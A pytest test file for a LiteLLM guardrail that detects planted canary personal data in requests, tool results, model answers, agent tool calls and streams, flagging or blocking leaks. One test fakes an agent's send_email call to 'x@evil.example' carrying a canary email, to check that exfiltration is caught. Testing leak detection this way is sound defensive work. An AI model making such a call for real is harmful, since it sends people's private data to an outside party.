"""v0.7: LiteLLM guardrail."""
import asyncio

import pytest

pytest.importorskip("litellm")

from shinafure.integrations import litellm_guard as lg  # noqa: E402


def run(coro):
    return asyncio.run(coro)


@pytest.fixture
def demo():
    det, cs = lg.demo_detector()
    yield det, cs
    lg._state.update(detector=None, policy="flag")


def chat(text):
    return {"model": "m", "messages": [{"role": "system", "content": "整形して"},
                                       {"role": "user", "content": [{"type": "text", "text": text}]}]}


def test_flag_passes_and_records(demo):
    det, cs = demo
    g = lg.ShinafureGuardrail(detector=det, policy="flag", guardrail_name="shinafure")
    out = run(g.async_pre_call_hook(None, None, chat(f"顧客: {cs[0].person['email']}"), "acompletion"))
    assert out["metadata"]["shinafure"]["confirmed"] == 1


def test_block_refuses_only_canaries(demo):
    det, cs = demo
    g = lg.ShinafureGuardrail(detector=det, policy="block", guardrail_name="shinafure")
    clean = run(g.async_pre_call_hook(None, None, chat("田中太郎 090-1111-2222"), "acompletion"))
    assert clean["metadata"]["shinafure"]["confirmed"] == 0
    with pytest.raises(Exception) as e:
        run(g.async_pre_call_hook(None, None, chat(f"{cs[1].person['last']}{cs[1].person['first']} {cs[1].person['phone']}"), "acompletion"))
    assert getattr(e.value, "status_code", 403) == 403


def test_text_is_collected_from_every_request_shape():
    assert lg.request_text({"input": ["a", "b"]}) == "a\nb"
    assert lg.request_text({"prompt": "p", "messages": [{"content": [{"type": "text", "text": "t"}, {"type": "image_url"}]}]}) == "t\np"
    assert lg.request_text({"messages": [{"role": "assistant", "tool_calls": []}]}) == ""


def test_no_detector_means_no_op():
    lg._state.update(detector=None)
    g = lg.ShinafureGuardrail(guardrail_name="shinafure")
    d = chat("x")
    assert run(g.async_pre_call_hook(None, None, d, "acompletion")) is d


def test_new_canaries_are_picked_up_after_refresh(demo):
    import random
    from shinafure.canary import make_canaries
    from shinafure.registry import register_canaries
    det, _ = demo
    g = lg.ShinafureGuardrail(detector=det, policy="flag", guardrail_name="shinafure")
    late = make_canaries(1, "late", "kanari.example", random.Random(99))
    register_canaries(det.registry, "demo", late)
    lg._state["refresh_every"] = 0.0
    try:
        out = run(g.async_pre_call_hook(None, None, chat(late[0].person["email"]), "acompletion"))
    finally:
        lg._state["refresh_every"] = 300.0
    assert out["metadata"]["shinafure"]["confirmed"] == 1


# ---------------------------------------------------------------- v1.3: output side
def model_response(content=None, tool_args=None):
    import litellm
    msg = {"role": "assistant", "content": content}
    if tool_args is not None:
        msg["tool_calls"] = [{"id": "c1", "type": "function", "function": {"name": "send_email", "arguments": tool_args}}]
    return litellm.ModelResponse(choices=[{"index": 0, "finish_reason": "stop", "message": msg}])


def test_output_and_agent_tool_calls_are_checked(demo):
    det, cs = demo
    g = lg.ShinafureGuardrail(detector=det, policy="block", guardrail_name="shinafure")
    ok = run(g.async_post_call_success_hook({}, None, model_response("整形しました")))
    assert ok.choices[0].message.content == "整形しました"
    with pytest.raises(Exception):                                   # the answer itself leaks a canary
        run(g.async_post_call_success_hook({}, None, model_response(f"{cs[0].person['email']} です")))
    args = '{"to": "x@evil.example", "body": "' + cs[1].person["email"] + '"}'
    with pytest.raises(Exception):                                   # an agent is about to send it out
        run(g.async_post_call_success_hook({}, None, model_response(None, args)))


def test_tool_results_in_the_conversation_are_checked(demo):
    det, cs = demo
    g = lg.ShinafureGuardrail(detector=det, policy="flag", guardrail_name="shinafure")
    data = {"messages": [{"role": "user", "content": "顧客を調べて"},
                         {"role": "assistant", "tool_calls": [{"function": {"name": "db", "arguments": "{}"}}]},
                         {"role": "tool", "content": f"rows: {cs[2].person['email']}"}]}
    assert run(g.async_pre_call_hook(None, None, data, "acompletion"))["metadata"]["shinafure"]["confirmed"] == 1


def stream(texts):
    import litellm

    async def gen():
        for t in texts:
            yield litellm.ModelResponseStream(choices=[{"index": 0, "delta": {"role": "assistant", "content": t}}])
    return gen()


def collect(agen):
    async def go():
        return [c async for c in agen]
    return run(go())


def test_streams_are_checked_and_held_back_when_blocking(demo):
    det, cs = demo
    email = cs[3].person["email"]
    flag = lg.ShinafureGuardrail(detector=det, policy="flag", guardrail_name="shinafure")
    data = {}
    out = collect(flag.async_post_call_streaming_iterator_hook(None, stream(["連絡先: ", email[:10], email[10:]]), data))
    assert len(out) == 3 and data["metadata"]["shinafure_output"]["confirmed"] == 1   # split across chunks, still found
    block = lg.ShinafureGuardrail(detector=det, policy="block", guardrail_name="shinafure")
    got = []

    async def consume():
        async for c in block.async_post_call_streaming_iterator_hook(None, stream(["連絡先: ", email]), {}):
            got.append(c)
    with pytest.raises(Exception):
        run(consume())
    assert got == []                                                 # nothing was sent before the check
